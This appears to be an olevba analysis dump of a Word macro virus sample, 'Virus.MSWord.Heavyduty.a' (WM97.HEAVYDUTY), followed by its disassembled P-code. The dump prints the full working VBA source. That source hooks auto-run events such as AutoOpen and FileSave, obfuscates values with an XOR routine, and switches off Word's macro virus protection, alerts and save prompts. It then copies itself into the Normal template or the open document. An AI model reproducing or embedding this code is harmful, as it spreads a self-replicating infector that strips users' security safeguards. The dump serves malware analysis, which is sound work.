olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Heavyduty.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Heavyduty.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ThisDocument1.cls 
in file: ./Virus.MSWord.Heavyduty.a - OLE stream: 'Macros/VBA/ThisDocument1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub AUTOOPEN(): Call VLAM: End Sub
Private Sub AUTOCLOSE(): Call VLAM: End Sub
Private Sub AUTOEXEC(): Call VLAM: End Sub
Private Sub AUTOEXIT(): Call VLAM: End Sub
Private Sub AUTOSAVE(): Call VLAM: End Sub
Private Sub AUTONEW(): Call VLAM: End Sub
Private Sub DOCUMENT_OPEN(): Call VLAM: End Sub
Private Sub DOCUMENT_SAVE(): Call VLAM: End Sub
Private Sub DOCUMENT_CLOSE(): Call VLAM: End Sub
Private Sub DOCUMENT_NEW(): Call VLAM: End Sub
Private Sub FILEOPEN(): Call VLAM: End Sub
Private Sub FILESAVE(): Call VLAM: End Sub
Private Sub FILECLOSE(): Call VLAM: End Sub
Private Sub FILENEW(): Call VLAM: End Sub
Private Function T(STR)
For i = Asc(Mid(UCase(UCase(UCase(UCase("KKKK")))), Int(Rnd * 3) + Fix(Fix(Fix(1))), Int(1))) - 74 To Len(STR)
P = P & Chr(Asc(Mid(STR, i, Fix(Fix(Fix(1))))) Xor Int(Int(Int(Int(Int(3))))))
Next
T = P
End Function
Private Sub VLAM()
On Error Resume Next
DECLARATIONS:
Set APP = Application.Options.Application.Options.Application
Set OPT = Options.Application.Options.Application.Options
Set ST1 = APP.OPT.APP.OPT.APP.OPT.APP.OPT.APP.OPT.VirusProtection
Set ST2 = APP.OPT.APP.OPT.APP.OPT.APP.OPT.APP.OPT.SaveNormalPrompt
Set ST3 = OPT.APP.OPT.APP.OPT.APP.OPT.APP.OPT.APP.DisplayAlerts
Set ST4 = OPT.APP.OPT.APP.OPT.APP.OPT.APP.OPT.APP.EnableCancelKey
Set ST5 = OPT.APP.OPT.APP.OPT.APP.OPT.APP.OPT.APP.DisplayStatusBar
Set ST6 = OPT.APP.OPT.APP.OPT.APP.OPT.APP.OPT.APP.ShowVisualBasicEditor
Set SMA = APP.OPT.APP.OPT.APP.OPT.APP.OPT.APP.OPT.SendMailAttach
Set N = NormalTemplate
Set NV = N.VBProject
Set NVV = NV.VBCOMPONENTS(Asc(Mid(UCase(UCase(UCase(T("HHHH")))), Int(Int(Int(Int(Rnd * 3)))) + Fix(Fix(Fix(1))), Fix(Fix(Fix(1))))) - Int(Int(Int(Int(Int(74))))))
Set NVVC = NVV.CODEMODULE
Set A = ActiveDocument
Set AV = A.VBProject
Set AVV = AV.VBCOMPONENTS(Asc(Mid(UCase(UCase(UCase(T("HHHH")))), Int(Int(Int(Int(Rnd * 3)))) + Fix(Fix(Fix(1))), Fix(Fix(Fix(1))))) - Int(Int(Int(Int(Int(74))))))
Set AVVC = AVV.CODEMODULE
Set d = ThisDocument
Set DV = d.VBProject
Set DVV = DV.VBCOMPONENTS(Asc(Mid(UCase(UCase(UCase(T("HHHH")))), Int(Int(Int(Int(Rnd * 3)))) + Fix(Fix(Fix(1))), Fix(Fix(Fix(1))))) - Int(Int(Int(Int(Int(74))))))
Set DVVC = DVV.CODEMODULE
Set NORN = NVV.VBE.VBPROJECTS(Asc(Mid(UCase(UCase(UCase(T("HHHH")))), Int(Int(Int(Int(Rnd * 3)))) + Fix(Fix(Fix(1))), Fix(Fix(Fix(1))))) - Int(Int(Int(Int(Int(74))))))
Set DOCN = AVV.VBE.VBPROJECTS(Asc(Mid(UCase(UCase(UCase(T("HHHH")))), Int(Int(Int(Int(Rnd * 3)))) + Fix(Fix(Fix(1))), Fix(Fix(Fix(1))))) - Int(Int(Int(Int(Int(74))))))
SMA = Asc(Mid(UCase(UCase(UCase(T("HHHH")))), Int(Int(Int(Int(Rnd * 3)))) + Fix(Fix(Fix(1))), Fix(Fix(Fix(1))))) - Int(Int(Int(Int(Int(74)))))
MYCODE = UCase(UCase(UCase(UCase(DVVC.LINES((Asc(Mid(UCase(UCase(UCase(T("HHHH")))), Int(Rnd * 3) + Fix(Fix(Fix(1))), Fix(Fix(Fix(1))))) - Int(Int(Int(Int(Int(74)))))), 140)))))
NAAM = UCase(UCase(UCase("VLAM")))
ST1 = Asc(Mid(UCase(UCase(UCase(T("HHHH")))), Int(Int(Int(Int(Rnd * 3)))) + Fix(Fix(Fix(1))), Fix(Fix(Fix(1))))) - Int(Int(Int(Int(Int(75)))))
ST2 = Asc(Mid(UCase(UCase(UCase(T("HHHH")))), Int(Int(Int(Int(Rnd * 3)))) + Fix(Fix(Fix(1))), Fix(Fix(Fix(1))))) - Int(Int(Int(Int(Int(75)))))
ST3 = wdAlertsNone
ST4 = Asc(Mid(UCase(UCase(UCase(T("HHHH")))), Int(Int(Int(Int(Rnd * 3)))) + Fix(Fix(Fix(1))), Fix(Fix(Fix(1))))) - Int(Int(Int(Int(Int(75)))))
ST5 = Asc(Mid(UCase(UCase(UCase(T("HHHH")))), Int(Int(Int(Int(Rnd * 3)))) + Fix(Fix(Fix(1))), Fix(Fix(Fix(1))))) - Int(Int(Int(Int(Int(75)))))
ST6 = Asc(Mid(UCase(UCase(UCase(T("HHHH")))), Int(Int(Int(Int(Rnd * 3)))) + Fix(Fix(Fix(1))), Fix(Fix(Fix(1))))) - Int(Int(Int(Int(Int(75)))))
Select Case UCase(UCase(UCase(UCase(UCase(UCase(ThisDocument.Name))))))
Case UCase(UCase(UCase(UCase(UCase(UCase(UCase(T("MLQNBO-GLW"))))))))
    AVVC.DELETELINES (Asc(Mid(UCase(UCase(UCase(T("HHHH")))), Int(Int(Int(Int(Rnd * 3)))) + Fix(Fix(Fix(1))), Fix(Fix(Fix(1))))) - Int(Int(Int(Int(Int(74)))))), AVVC.COUNTOFLINES
    AVVC.ADDFROMSTRING UCase(MYCODE)
    DOCN.Name = UCase(UCase(UCase(NAAM)))
    ActiveDocument.Save
Case Is <> UCase(UCase(UCase(UCase(UCase(UCase(T("MLQNBO-GLW")))))))
    NVVC.DELETELINES (Asc(Mid(UCase(UCase(UCase(T("HHHH")))), Int(Int(Int(Int(Rnd * 3)))) + Fix(Fix(Fix(1))), Fix(Fix(Fix(1))))) - Int(Int(Int(Int(Int(74)))))), NVVC.COUNTOFLINES
    NVVC.ADDFROMSTRING UCase(MYCODE)
    NORN.Name = UCase(UCase(UCase(NAAM)))
    N.Save
End Select
If Day(Now()) = Int(Rnd * 31) + 1 Then
Application.Caption = NAAM & " " & ActiveDocument.Name
End If
'WM97.HEAVYDUTY
End Sub










































-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Heavyduty.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 10015 bytes
' Macros/VBA/ThisDocument1 - 8161 bytes
' Line #0:
' 	FuncDefn (Private Sub AUTOOPEN())
' 	BoS 0x0000 
' 	ArgsCall (Call) VLAM 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #1:
' 	FuncDefn (Private Sub AUTOCLOSE())
' 	BoS 0x0000 
' 	ArgsCall (Call) VLAM 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #2:
' 	FuncDefn (Private Sub AUTOEXEC())
' 	BoS 0x0000 
' 	ArgsCall (Call) VLAM 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #3:
' 	FuncDefn (Private Sub AUTOEXIT())
' 	BoS 0x0000 
' 	ArgsCall (Call) VLAM 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #4:
' 	FuncDefn (Private Sub AUTOSAVE())
' 	BoS 0x0000 
' 	ArgsCall (Call) VLAM 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #5:
' 	FuncDefn (Private Sub AUTONEW())
' 	BoS 0x0000 
' 	ArgsCall (Call) VLAM 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #6:
' 	FuncDefn (Private Sub DOCUMENT_OPEN())
' 	BoS 0x0000 
' 	ArgsCall (Call) VLAM 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #7:
' 	FuncDefn (Private Sub DOCUMENT_SAVE())
' 	BoS 0x0000 
' 	ArgsCall (Call) VLAM 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #8:
' 	FuncDefn (Private Sub DOCUMENT_CLOSE())
' 	BoS 0x0000 
' 	ArgsCall (Call) VLAM 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #9:
' 	FuncDefn (Private Sub DOCUMENT_NEW())
' 	BoS 0x0000 
' 	ArgsCall (Call) VLAM 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #10:
' 	FuncDefn (Private Sub FILEOPEN())
' 	BoS 0x0000 
' 	ArgsCall (Call) VLAM 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #11:
' 	FuncDefn (Private Sub FILESAVE())
' 	BoS 0x0000 
' 	ArgsCall (Call) VLAM 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #12:
' 	FuncDefn (Private Sub FILECLOSE())
' 	BoS 0x0000 
' 	ArgsCall (Call) VLAM 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #13:
' 	FuncDefn (Private Sub FILENEW())
' 	BoS 0x0000 
' 	ArgsCall (Call) VLAM 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #14:
' 	FuncDefn (Private Function T(STR, id_FFFE As Variant))
' Line #15:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitStr 0x0004 "KKKK"
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	FnFix 
' 	FnFix 
' 	FnFix 
' 	Add 
' 	LitDI2 0x0001 
' 	FnInt 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x004A 
' 	Sub 
' 	Ld STR 
' 	FnLen 
' 	For 
' Line #16:
' 	Ld P 
' 	Ld STR 
' 	Ld i 
' 	LitDI2 0x0001 
' 	FnFix 
' 	FnFix 
' 	FnFix 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0003 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	Xor 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St P 
' Line #17:
' 	StartForVariable 
' 	Next 
' Line #18:
' 	Ld P 
' 	St T 
' Line #19:
' 	EndFunc 
' Line #20:
' 	FuncDefn (Private Sub VLAM())
' Line #21:
' 	OnError (Resume Next) 
' Line #22:
' 	Label DECLARATIONS 
' Line #23:
' 	SetStmt 
' 	Ld Application 
' 	MemLd Options 
' 	MemLd Application 
' 	MemLd Options 
' 	MemLd Application 
' 	Set APP 
' Line #24:
' 	SetStmt 
' 	Ld Options 
' 	MemLd Application 
' 	MemLd Options 
' 	MemLd Application 
' 	MemLd Options 
' 	Set OPT 
' Line #25:
' 	SetStmt 
' 	Ld APP 
' 	MemLd OPT 
' 	MemLd APP 
' 	MemLd OPT 
' 	MemLd APP 
' 	MemLd OPT 
' 	MemLd APP 
' 	MemLd OPT 
' 	MemLd APP 
' 	MemLd OPT 
' 	MemLd VirusProtection 
' 	Set ST1 
' Line #26:
' 	SetStmt 
' 	Ld APP 
' 	MemLd OPT 
' 	MemLd APP 
' 	MemLd OPT 
' 	MemLd APP 
' 	MemLd OPT 
' 	MemLd APP 
' 	MemLd OPT 
' 	MemLd APP 
' 	MemLd OPT 
' 	MemLd SaveNormalPrompt 
' 	Set ST2 
' Line #27:
' 	SetStmt 
' 	Ld OPT 
' 	MemLd APP 
' 	MemLd OPT 
' 	MemLd APP 
' 	MemLd OPT 
' 	MemLd APP 
' 	MemLd OPT 
' 	MemLd APP 
' 	MemLd OPT 
' 	MemLd APP 
' 	MemLd DisplayAlerts 
' 	Set ST3 
' Line #28:
' 	SetStmt 
' 	Ld OPT 
' 	MemLd APP 
' 	MemLd OPT 
' 	MemLd APP 
' 	MemLd OPT 
' 	MemLd APP 
' 	MemLd OPT 
' 	MemLd APP 
' 	MemLd OPT 
' 	MemLd APP 
' 	MemLd EnableCancelKey 
' 	Set ST4 
' Line #29:
' 	SetStmt 
' 	Ld OPT 
' 	MemLd APP 
' 	MemLd OPT 
' 	MemLd APP 
' 	MemLd OPT 
' 	MemLd APP 
' 	MemLd OPT 
' 	MemLd APP 
' 	MemLd OPT 
' 	MemLd APP 
' 	MemLd DisplayStatusBar 
' 	Set ST5 
' Line #30:
' 	SetStmt 
' 	Ld OPT 
' 	MemLd APP 
' 	MemLd OPT 
' 	MemLd APP 
' 	MemLd OPT 
' 	MemLd APP 
' 	MemLd OPT 
' 	MemLd APP 
' 	MemLd OPT 
' 	MemLd APP 
' 	MemLd ShowVisualBasicEditor 
' 	Set ST6 
' Line #31:
' 	SetStmt 
' 	Ld APP 
' 	MemLd OPT 
' 	MemLd APP 
' 	MemLd OPT 
' 	MemLd APP 
' 	MemLd OPT 
' 	MemLd APP 
' 	MemLd OPT 
' 	MemLd APP 
' 	MemLd OPT 
' 	MemLd SendMailAttach 
' 	Set SMA 
' Line #32:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set N 
' Line #33:
' 	SetStmt 
' 	Ld N 
' 	MemLd VBProject 
' 	Set NV 
' Line #34:
' 	SetStmt 
' 	LitStr 0x0004 "HHHH"
' 	ArgsLd T 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	LitDI2 0x0001 
' 	FnFix 
' 	FnFix 
' 	FnFix 
' 	Add 
' 	LitDI2 0x0001 
' 	FnFix 
' 	FnFix 
' 	FnFix 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x004A 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	Sub 
' 	Ld NV 
' 	ArgsMemLd VBCOMPONENTS 0x0001 
' 	Set NVV 
' Line #35:
' 	SetStmt 
' 	Ld NVV 
' 	MemLd CODEMODULE 
' 	Set NVVC 
' Line #36:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set A 
' Line #37:
' 	SetStmt 
' 	Ld A 
' 	MemLd VBProject 
' 	Set AV 
' Line #38:
' 	SetStmt 
' 	LitStr 0x0004 "HHHH"
' 	ArgsLd T 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	LitDI2 0x0001 
' 	FnFix 
' 	FnFix 
' 	FnFix 
' 	Add 
' 	LitDI2 0x0001 
' 	FnFix 
' 	FnFix 
' 	FnFix 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x004A 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	Sub 
' 	Ld AV 
' 	ArgsMemLd VBCOMPONENTS 0x0001 
' 	Set AVV 
' Line #39:
' 	SetStmt 
' 	Ld AVV 
' 	MemLd CODEMODULE 
' 	Set AVVC 
' Line #40:
' 	SetStmt 
' 	Ld ThisDocument 
' 	Set d 
' Line #41:
' 	SetStmt 
' 	Ld d 
' 	MemLd VBProject 
' 	Set DV 
' Line #42:
' 	SetStmt 
' 	LitStr 0x0004 "HHHH"
' 	ArgsLd T 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	LitDI2 0x0001 
' 	FnFix 
' 	FnFix 
' 	FnFix 
' 	Add 
' 	LitDI2 0x0001 
' 	FnFix 
' 	FnFix 
' 	FnFix 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x004A 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	Sub 
' 	Ld DV 
' 	ArgsMemLd VBCOMPONENTS 0x0001 
' 	Set DVV 
' Line #43:
' 	SetStmt 
' 	Ld DVV 
' 	MemLd CODEMODULE 
' 	Set DVVC 
' Line #44:
' 	SetStmt 
' 	LitStr 0x0004 "HHHH"
' 	ArgsLd T 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	LitDI2 0x0001 
' 	FnFix 
' 	FnFix 
' 	FnFix 
' 	Add 
' 	LitDI2 0x0001 
' 	FnFix 
' 	FnFix 
' 	FnFix 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x004A 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	Sub 
' 	Ld NVV 
' 	MemLd VBE 
' 	ArgsMemLd VBPROJECTS 0x0001 
' 	Set NORN 
' Line #45:
' 	SetStmt 
' 	LitStr 0x0004 "HHHH"
' 	ArgsLd T 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	LitDI2 0x0001 
' 	FnFix 
' 	FnFix 
' 	FnFix 
' 	Add 
' 	LitDI2 0x0001 
' 	FnFix 
' 	FnFix 
' 	FnFix 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x004A 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	Sub 
' 	Ld AVV 
' 	MemLd VBE 
' 	ArgsMemLd VBPROJECTS 0x0001 
' 	Set DOCN 
' Line #46:
' 	LitStr 0x0004 "HHHH"
' 	ArgsLd T 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	LitDI2 0x0001 
' 	FnFix 
' 	FnFix 
' 	FnFix 
' 	Add 
' 	LitDI2 0x0001 
' 	FnFix 
' 	FnFix 
' 	FnFix 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x004A 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	Sub 
' 	St SMA 
' Line #47:
' 	LitStr 0x0004 "HHHH"
' 	ArgsLd T 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	FnFix 
' 	FnFix 
' 	FnFix 
' 	Add 
' 	LitDI2 0x0001 
' 	FnFix 
' 	FnFix 
' 	FnFix 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x004A 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	Sub 
' 	Paren 
' 	LitDI2 0x008C 
' 	Ld DVVC 
' 	ArgsMemLd LINES 0x0002 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	St MYCODE 
' Line #48:
' 	LitStr 0x0004 "VLAM"
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	St NAAM 
' Line #49:
' 	LitStr 0x0004 "HHHH"
' 	ArgsLd T 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	LitDI2 0x0001 
' 	FnFix 
' 	FnFix 
' 	FnFix 
' 	Add 
' 	LitDI2 0x0001 
' 	FnFix 
' 	FnFix 
' 	FnFix 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x004B 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	Sub 
' 	St ST1 
' Line #50:
' 	LitStr 0x0004 "HHHH"
' 	ArgsLd T 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	LitDI2 0x0001 
' 	FnFix 
' 	FnFix 
' 	FnFix 
' 	Add 
' 	LitDI2 0x0001 
' 	FnFix 
' 	FnFix 
' 	FnFix 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x004B 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	Sub 
' 	St ST2 
' Line #51:
' 	Ld wdAlertsNone 
' 	St ST3 
' Line #52:
' 	LitStr 0x0004 "HHHH"
' 	ArgsLd T 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	LitDI2 0x0001 
' 	FnFix 
' 	FnFix 
' 	FnFix 
' 	Add 
' 	LitDI2 0x0001 
' 	FnFix 
' 	FnFix 
' 	FnFix 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x004B 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	Sub 
' 	St ST4 
' Line #53:
' 	LitStr 0x0004 "HHHH"
' 	ArgsLd T 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	LitDI2 0x0001 
' 	FnFix 
' 	FnFix 
' 	FnFix 
' 	Add 
' 	LitDI2 0x0001 
' 	FnFix 
' 	FnFix 
' 	FnFix 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x004B 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	Sub 
' 	St ST5 
' Line #54:
' 	LitStr 0x0004 "HHHH"
' 	ArgsLd T 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	LitDI2 0x0001 
' 	FnFix 
' 	FnFix 
' 	FnFix 
' 	Add 
' 	LitDI2 0x0001 
' 	FnFix 
' 	FnFix 
' 	FnFix 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x004B 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	Sub 
' 	St ST6 
' Line #55:
' 	Ld ThisDocument 
' 	MemLd New 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	SelectCase 
' Line #56:
' 	LitStr 0x000A "MLQNBO-GLW"
' 	ArgsLd T 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	Case 
' 	CaseDone 
' Line #57:
' 	LitStr 0x0004 "HHHH"
' 	ArgsLd T 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	LitDI2 0x0001 
' 	FnFix 
' 	FnFix 
' 	FnFix 
' 	Add 
' 	LitDI2 0x0001 
' 	FnFix 
' 	FnFix 
' 	FnFix 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x004A 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	Sub 
' 	Paren 
' 	Ld AVVC 
' 	MemLd COUNTOFLINES 
' 	Ld AVVC 
' 	ArgsMemCall DELETELINES 0x0002 
' Line #58:
' 	Ld MYCODE 
' 	ArgsLd UCase 0x0001 
' 	Ld AVVC 
' 	ArgsMemCall ADDFROMSTRING 0x0001 
' Line #59:
' 	Ld NAAM 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	Ld DOCN 
' 	MemSt New 
' Line #60:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #61:
' 	LitStr 0x000A "MLQNBO-GLW"
' 	ArgsLd T 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	CaseNe 
' 	CaseDone 
' Line #62:
' 	LitStr 0x0004 "HHHH"
' 	ArgsLd T 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	LitDI2 0x0001 
' 	FnFix 
' 	FnFix 
' 	FnFix 
' 	Add 
' 	LitDI2 0x0001 
' 	FnFix 
' 	FnFix 
' 	FnFix 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x004A 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	FnInt 
' 	Sub 
' 	Paren 
' 	Ld NVVC 
' 	MemLd COUNTOFLINES 
' 	Ld NVVC 
' 	ArgsMemCall DELETELINES 0x0002 
' Line #63:
' 	Ld MYCODE 
' 	ArgsLd UCase 0x0001 
' 	Ld NVVC 
' 	ArgsMemCall ADDFROMSTRING 0x0001 
' Line #64:
' 	Ld NAAM 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	ArgsLd UCase 0x0001 
' 	Ld NORN 
' 	MemSt New 
' Line #65:
' 	Ld N 
' 	ArgsMemCall Save 0x0000 
' Line #66:
' 	EndSelect 
' Line #67:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x001F 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	Eq 
' 	IfBlock 
' Line #68:
' 	Ld NAAM 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Concat 
' 	Ld Application 
' 	MemSt Caption 
' Line #69:
' 	EndIfBlock 
' Line #70:
' 	QuoteRem 0x0000 0x000E "WM97.HEAVYDUTY"
' Line #71:
' 	EndSub 
' Line #72:
' Line #73:
' Line #74:
' Line #75:
' Line #76:
' Line #77:
' Line #78:
' Line #79:
' Line #80:
' Line #81:
' Line #82:
' Line #83:
' Line #84:
' Line #85:
' Line #86:
' Line #87:
' Line #88:
' Line #89:
' Line #90:
' Line #91:
' Line #92:
' Line #93:
' Line #94:
' Line #95:
' Line #96:
' Line #97:
' Line #98:
' Line #99:
' Line #100:
' Line #101:
' Line #102:
' Line #103:
' Line #104:
' Line #105:
' Line #106:
' Line #107:
' Line #108:
' Line #109:
' Line #110:
' Line #111:
' Line #112:
' Line #113:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
